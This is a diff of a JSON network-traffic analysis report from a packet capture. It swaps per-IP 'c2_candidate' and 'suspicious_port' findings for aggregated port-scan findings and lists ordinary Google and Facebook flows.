@@ -10,7 +10,7 @@
     "unique_dns_queries": 70,
     "nxdomain_count": 470,
     "flows": 11825,
-    "findings": 75,
+    "findings": 9,
     "extractor_errors": {},
     "uploaded_bytes": 18309869,
     "downloaded_bytes": 17909367,
@@ -679,7 +679,7 @@
           "www.wajam.com"
         ],
         "findings_indices": [
-          47
+          3
         ],
         "service_flows_in": 0,
         "service_unique_srcs": [],
@@ -1066,7 +1066,7 @@
           "www.facebook.com"
         ],
         "findings_indices": [
-          48
+          4
         ],
         "service_flows_in": 0,
         "service_unique_srcs": [],
@@ -1168,7 +1168,7 @@
           "www.google.com"
         ],
         "findings_indices": [
-          46
+          2
         ],
         "service_flows_in": 0,
         "service_unique_srcs": [],
@@ -1320,29 +1320,33 @@
     ],
     "external": [
       {
-        "ip": "190.36.51.201",
+        "ip": "213.155.151.183",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806056.907931,
-        "last_seen": 1428871277.741253,
-        "flows_out": 9,
-        "flows_in": 9,
-        "bytes_out": 10595,
-        "bytes_in": 4565,
+        "first_seen": 1428800743.5667,
+        "last_seen": 1428883196.960104,
+        "flows_out": 142,
+        "flows_in": 142,
+        "bytes_out": 1552911,
+        "bytes_in": 1839374,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "chrome.google.com",
+          "clients2.google.com",
+          "clients4.google.com",
+          "clients6.google.com",
+          "play.google.com",
+          "talkgadget.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          17
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1353,29 +1357,33 @@
         "country": null
       },
       {
-        "ip": "86.100.133.100",
+        "ip": "213.155.151.187",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806170.796487,
-        "last_seen": 1428849505.593044,
-        "flows_out": 3,
-        "flows_in": 4,
-        "bytes_out": 3645,
-        "bytes_in": 1493,
+        "first_seen": 1428800750.388449,
+        "last_seen": 1428874414.670689,
+        "flows_out": 127,
+        "flows_in": 127,
+        "bytes_out": 1537038,
+        "bytes_in": 1801763,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "chrome.google.com",
+          "clients2.google.com",
+          "clients3.google.com",
+          "clients6.google.com",
+          "play.google.com",
+          "talkgadget.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          34
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1386,29 +1394,30 @@
         "country": null
       },
       {
-        "ip": "109.160.179.78",
+        "ip": "31.13.64.1",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428849607.399062,
-        "last_seen": 1428871358.381087,
-        "flows_out": 2,
-        "flows_in": 3,
-        "bytes_out": 681,
-        "bytes_in": 618,
+        "first_seen": 1428796829.09503,
+        "last_seen": 1428883193.747437,
+        "flows_out": 134,
+        "flows_in": 134,
+        "bytes_out": 1004600,
+        "bytes_in": 2081377,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.53",
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.53",
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "www.facebook.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          1
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1419,29 +1428,33 @@
         "country": null
       },
       {
-        "ip": "184.178.44.246",
+        "ip": "213.155.151.185",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806194.859199,
-        "last_seen": 1428871393.958002,
-        "flows_out": 2,
-        "flows_in": 2,
-        "bytes_out": 384,
-        "bytes_in": 372,
+        "first_seen": 1428796838.486014,
+        "last_seen": 1428879325.187167,
+        "flows_out": 33,
+        "flows_in": 33,
+        "bytes_out": 1158895,
+        "bytes_in": 1031577,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "apis.google.com",
+          "chrome.google.com",
+          "clients2.google.com",
+          "safebrowsing-cache.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          13
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1452,29 +1465,28 @@
         "country": null
       },
       {
-        "ip": "91.131.148.59",
+        "ip": "64.233.164.109",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428849553.914238,
-        "last_seen": 1428871379.820909,
-        "flows_out": 2,
-        "flows_in": 2,
-        "bytes_out": 256,
-        "bytes_in": 310,
+        "first_seen": 1428797368.186436,
+        "last_seen": 1428882909.651017,
+        "flows_out": 100,
+        "flows_in": 100,
+        "bytes_out": 1227296,
+        "bytes_in": 642176,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "imap.gmail.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          40
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1485,29 +1497,34 @@
         "country": null
       },
       {
-        "ip": "109.253.41.241",
+        "ip": "213.155.151.180",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806181.734139,
-        "last_seen": 1428871296.01701,
-        "flows_out": 2,
-        "flows_in": 2,
-        "bytes_out": 192,
-        "bytes_in": 186,
+        "first_seen": 1428805392.625141,
+        "last_seen": 1428878584.26695,
+        "flows_out": 201,
+        "flows_in": 201,
+        "bytes_out": 557876,
+        "bytes_in": 1113892,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "clients4.google.com",
+          "clients6.google.com",
+          "play.google.com",
+          "safebrowsing.google.com",
+          "talkgadget.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          2
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1518,29 +1535,128 @@
         "country": null
       },
       {
-        "ip": "201.223.74.111",
+        "ip": "213.155.151.155",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806213.453198,
-        "last_seen": 1428806215.487867,
+        "first_seen": 1428796975.968294,
+        "last_seen": 1428883203.40068,
+        "flows_out": 52,
+        "flows_in": 52,
+        "bytes_out": 758251,
+        "bytes_in": 869911,
+        "unique_dsts": [
+          "192.168.0.51",
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.51",
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "chrome.google.com",
+          "safebrowsing-cache.google.com",
+          "safebrowsing.google.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "216.58.209.133",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1428815367.174677,
+        "last_seen": 1428883174.860649,
+        "flows_out": 101,
+        "flows_in": 101,
+        "bytes_out": 565540,
+        "bytes_in": 744925,
+        "unique_dsts": [
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "mail.google.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "173.194.71.189",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1428809924.857804,
+        "last_seen": 1428883199.808875,
+        "flows_out": 17,
+        "flows_in": 17,
+        "bytes_out": 504421,
+        "bytes_in": 633248,
+        "unique_dsts": [
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "10.client-channel.google.com",
+          "11.client-channel.google.com",
+          "9.client-channel.google.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "54.163.111.61",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1428796822.311625,
+        "last_seen": 1428883204.126874,
         "flows_out": 1,
         "flows_in": 1,
-        "bytes_out": 192,
-        "bytes_in": 186,
+        "bytes_out": 416915,
+        "bytes_in": 668562,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "sni_domains": [],
         "dns_names": [],
-        "findings_indices": [
-          19
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1551,29 +1667,32 @@
         "country": null
       },
       {
-        "ip": "77.79.48.222",
+        "ip": "213.155.151.148",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806202.765815,
-        "last_seen": 1428849584.164778,
-        "flows_out": 1,
-        "flows_in": 2,
-        "bytes_out": 90,
-        "bytes_in": 248,
+        "first_seen": 1428796848.754581,
+        "last_seen": 1428883181.020681,
+        "flows_out": 96,
+        "flows_in": 96,
+        "bytes_out": 425918,
+        "bytes_in": 452385,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "clients2.google.com",
+          "clients6.google.com",
+          "safebrowsing-cache.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          26
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1584,60 +1703,32 @@
         "country": null
       },
       {
-        "ip": "181.29.63.21",
+        "ip": "213.155.151.182",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806184.468639,
-        "last_seen": 1428871323.052626,
-        "flows_out": 0,
-        "flows_in": 3,
-        "bytes_out": 0,
-        "bytes_in": 310,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          12
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "87.110.212.141",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428871397.523163,
-        "last_seen": 1428871401.90969,
-        "flows_out": 1,
-        "flows_in": 1,
-        "bytes_out": 180,
-        "bytes_in": 124,
+        "first_seen": 1428799147.378613,
+        "last_seen": 1428873804.751055,
+        "flows_out": 80,
+        "flows_in": 80,
+        "bytes_out": 453921,
+        "bytes_in": 328521,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "clients2.google.com",
+          "clients4.google.com",
+          "clients5.google.com",
+          "plus.google.com",
+          "tools.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          35
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1648,29 +1739,26 @@
         "country": null
       },
       {
-        "ip": "14.98.22.209",
+        "ip": "157.55.130.161",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806213.453178,
-        "last_seen": 1428806214.767551,
+        "first_seen": 1428796884.455093,
+        "last_seen": 1428883178.646178,
         "flows_out": 1,
         "flows_in": 1,
-        "bytes_out": 128,
-        "bytes_in": 124,
+        "bytes_out": 255232,
+        "bytes_in": 501928,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "sni_domains": [],
         "dns_names": [],
-        "findings_indices": [
-          10
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1681,29 +1769,32 @@
         "country": null
       },
       {
-        "ip": "91.185.124.44",
+        "ip": "213.155.151.153",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428806223.296877,
-        "last_seen": 1428806224.074441,
-        "flows_out": 1,
-        "flows_in": 1,
-        "bytes_out": 128,
-        "bytes_in": 124,
+        "first_seen": 1428796976.135599,
+        "last_seen": 1428873296.750131,
+        "flows_out": 130,
+        "flows_in": 130,
+        "bytes_out": 338457,
+        "bytes_in": 403095,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.51",
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "play.google.com",
+          "safebrowsing-cache.google.com",
+          "www.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          41
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1714,215 +1805,28 @@
         "country": null
       },
       {
-        "ip": "114.79.12.73",
+        "ip": "216.58.209.101",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428849563.290773,
-        "last_seen": 1428871411.53754,
-        "flows_out": 0,
-        "flows_in": 2,
-        "bytes_out": 0,
-        "bytes_in": 248,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          4
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "115.185.72.37",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428806181.734154,
-        "last_seen": 1428849588.430401,
-        "flows_out": 0,
-        "flows_in": 3,
-        "bytes_out": 0,
-        "bytes_in": 248,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          5
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "201.213.124.89",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428849557.274467,
-        "last_seen": 1428871352.052752,
-        "flows_out": 0,
-        "flows_in": 2,
-        "bytes_out": 0,
-        "bytes_in": 248,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          18
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "87.110.7.194",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428827915.820695,
-        "last_seen": 1428871418.756462,
-        "flows_out": 0,
-        "flows_in": 2,
-        "bytes_out": 0,
-        "bytes_in": 248,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          36
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "190.164.168.119",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428806164.87504,
-        "last_seen": 1428871374.7015,
-        "flows_out": 0,
-        "flows_in": 2,
-        "bytes_out": 0,
-        "bytes_in": 186,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          15
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "59.99.66.104",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428806231.96758,
-        "last_seen": 1428871385.068721,
-        "flows_out": 0,
-        "flows_in": 2,
-        "bytes_out": 0,
-        "bytes_in": 186,
-        "unique_dsts": [],
-        "unique_srcs": [
-          "192.168.0.53"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          23
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "71.95.164.42",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1428827933.8679,
-        "last_seen": 1428827934.236777,
-        "flows_out": 1,
-        "flows_in": 1,
-        "bytes_out": 64,
-        "bytes_in": 122,
+        "first_seen": 1428837389.272554,
+        "last_seen": 1428858883.133123,
+        "flows_out": 43,
+        "flows_in": 43,
+        "bytes_out": 333237,
+        "bytes_in": 377553,
         "unique_dsts": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "mail.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          24
-        ],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -1933,27 +1837,171 @@
         "country": null
       },
       {
-        "ip": "78.62.0.115",
+        "ip": "213.155.151.154",
         "is_internal": false,
         "roles": [
-          "external",
-          "c2_candidate"
+          "external"
         ],
-        "first_seen": 1428827943.164739,
-        "last_seen": 1428871266.083308,
-        "flows_out": 0,
-        "flows_in": 2,
-        "bytes_out": 0,
-        "bytes_in": 186,
-        "unique_dsts": [],
+        "first_seen": 1428796813.644687,
+        "last_seen": 1428844512.062351,
+        "flows_out": 63,
+        "flows_in": 63,
+        "bytes_out": 178072,
+        "bytes_in": 441077,
+        "unique_dsts": [
+          "192.168.0.54"
+        ],
         "unique_srcs": [
-          "192.168.0.53"
+          "192.168.0.54"
         ],
-        "sni_domains": [],
+        "sni_domains": [
+          "clients3.google.com",
+          "clients4.google.com",
+          "talkgadget.google.com"
+        ],
         "dns_names": [],
-        "findings_indices": [
-          29
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "31.13.91.2",
+        "is_internal": false,
+        "roles": [
+          "external"
         ],
+        "first_seen": 1428796983.183366,
+        "last_seen": 1428865539.826816,
+        "flows_out": 159,
+        "flows_in": 159,
+        "bytes_out": 303685,
+        "bytes_in": 311622,
+        "unique_dsts": [
+          "192.168.0.53",
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.53",
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "www.facebook.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "137.116.224.167",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1428799000.196344,
+        "last_seen": 1428881915.823985,
+        "flows_out": 25,
+        "flows_in": 25,
+        "bytes_out": 540842,
+        "bytes_in": 74265,
+        "unique_dsts": [
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "a.config.skype.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "216.58.209.132",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1428796809.74349,
+        "last_seen": 1428865273.776011,
+        "flows_out": 105,
+        "flows_in": 105,
+        "bytes_out": 214687,
+        "bytes_in": 289301,
+        "unique_dsts": [
+          "192.168.0.51",
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.51",
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "www.google.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "213.155.151.151",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1428809577.940494,
+        "last_seen": 1428882202.411464,
+        "flows_out": 42,
+        "flows_in": 42,
+        "bytes_out": 323065,
+        "bytes_in": 169556,
+        "unique_dsts": [
+          "192.168.0.51",
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.51",
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "clients2.google.com",
+          "clients5.google.com",
+          "play.google.com",
+          "plus.google.com",
+          "safebrowsing-cache.google.com",
+          "safebrowsing.google.com",
+          "tools.google.com",
+          "www.gstatic.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
         "service_flows_in": 0,
         "service_unique_srcs": [],
         "mac": null,
@@ -4166,740 +4214,118 @@
   },
   "findings": [
     {
-      "type": "suspicious_port",
-      "value": "105.156.46.30:8080",
-      "confidence": 0.5,
+      "type": "port_scan",
+      "value": "192.168.0.53 -> *:80",
+      "confidence": 0.9,
       "evidence": {
-        "dst_ip": "105.156.46.30",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
+        "src_ip": "192.168.0.53",
+        "dst_port": 80,
+        "distinct_dsts": 205,
+        "total_flows": 690,
+        "thin_targets": 201,
+        "top_dsts": [
+          {
+            "ip": "94.242.254.213",
+            "flows": 387
+          },
+          {
+            "ip": "164.77.140.52",
+            "flows": 6
+          },
+          {
+            "ip": "109.169.46.63",
+            "flows": 5
+          },
+          {
+            "ip": "85.2.174.13",
+            "flows": 4
+          },
+          {
+            "ip": "94.190.83.120",
+            "flows": 3
+          },
+          {
+            "ip": "190.188.20.111",
+            "flows": 3
+          },
+          {
+            "ip": "93.117.124.253",
+            "flows": 3
+          },
+          {
+            "ip": "186.10.124.47",
+            "flows": 3
+          },
+          {
+            "ip": "88.158.43.54",
+            "flows": 3
+          },
+          {
+            "ip": "168.167.242.81",
+            "flows": 3
+          }
         ],
-        "total_bytes": 124
+        "threshold": 10
       },
-      "first_seen": 1428827906.523715,
-      "last_seen": 1428827909.476937
+      "first_seen": null,
+      "last_seen": null
     },
     {
-      "type": "suspicious_port",
-      "value": "109.160.179.78:8080",
-      "confidence": 0.5,
+      "type": "port_scan",
+      "value": "192.168.0.53 -> *:8080",
+      "confidence": 0.9,
       "evidence": {
-        "dst_ip": "109.160.179.78",
+        "src_ip": "192.168.0.53",
         "dst_port": 8080,
-        "flow_count": 3,
-        "src_ips": [
-          "192.168.0.53"
+        "distinct_dsts": 47,
+        "total_flows": 224,
+        "thin_targets": 44,
+        "top_dsts": [
+          {
+            "ip": "192.168.0.1",
+            "flows": 148
+          },
+          {
+            "ip": "190.36.51.201",
+            "flows": 9
+          },
+          {
+            "ip": "86.100.133.100",
+            "flows": 4
+          },
+          {
+            "ip": "115.185.72.37",
+            "flows": 3
+          },
+          {
+            "ip": "181.29.63.21",
+            "flows": 3
+          },
+          {
+            "ip": "109.160.179.78",
+            "flows": 3
+          },
+          {
+            "ip": "190.164.168.119",
+            "flows": 2
+          },
+          {
+            "ip": "109.253.41.241",
+            "flows": 2
+          },
+          {
+            "ip": "184.178.44.246",
+            "flows": 2
+          },
+          {
+            "ip": "77.79.48.222",
+            "flows": 2
+          }
         ],
-        "total_bytes": 618
+        "threshold": 10
       },
-      "first_seen": 1428849607.399062,
-      "last_seen": 1428871357.724848
-    },
-    {
-      "type": "suspicious_port",
-      "value": "109.253.41.241:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "109.253.41.241",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 186
-      },
-      "first_seen": 1428806181.734139,
-      "last_seen": 1428871294.61486
-    },
-    {
-      "type": "suspicious_port",
-      "value": "109.67.126.187:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "109.67.126.187",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871432.554755,
-      "last_seen": 1428871435.490996
-    },
-    {
-      "type": "suspicious_port",
-      "value": "114.79.12.73:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "114.79.12.73",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 248
-      },
-      "first_seen": 1428849563.290773,
-      "last_seen": 1428871411.53754
-    },
-    {
-      "type": "suspicious_port",
-      "value": "115.185.72.37:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "115.185.72.37",
-        "dst_port": 8080,
-        "flow_count": 3,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 248
-      },
-      "first_seen": 1428806181.734154,
-      "last_seen": 1428849588.430401
-    },
-    {
-      "type": "suspicious_port",
-      "value": "122.11.251.154:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "122.11.251.154",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428827874.804744,
-      "last_seen": 1428871369.756138
-    },
-    {
-      "type": "suspicious_port",
-      "value": "122.174.145.22:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "122.174.145.22",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428871330.380709,
-      "last_seen": 1428871330.380709
-    },
-    {
-      "type": "suspicious_port",
-      "value": "123.192.89.25:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "123.192.89.25",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 62
-      },
-      "first_seen": 1428806173.530952,
-      "last_seen": 1428806173.530952
-    },
-    {
-      "type": "suspicious_port",
-      "value": "139.190.240.84:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "139.190.240.84",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428871266.474307,
-      "last_seen": 1428871269.458289
-    },
-    {
-      "type": "suspicious_port",
-      "value": "14.98.22.209:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "14.98.22.209",
-        "dst_port": 8080,
-        "flow_count": 1,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 124
-      },
-      "first_seen": 1428806213.453178,
-      "last_seen": 1428806214.32812
-    },
-    {
-      "type": "suspicious_port",
-      "value": "181.134.13.0:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "181.134.13.0",
-        "dst_port": 8080,
-        "flow_count": 2,
-        "src_ips": [
-          "192.168.0.53"
-        ],
-        "total_bytes": 248
-      },
-      "first_seen": 1428827912.054657,
-      "last_seen": 1428871346.67772
-    },
-    {
-      "type": "suspicious_port",
-      "value": "181.29.63.21:8080",
-      "confidence": 0.5,
-      "evidence": {
-        "dst_ip": "181.29.63.21",
-        "dst_port": 8080,
-        "flow_count": 3,
-        "src_ips": [
-          "192.168.0.53"
-        ],
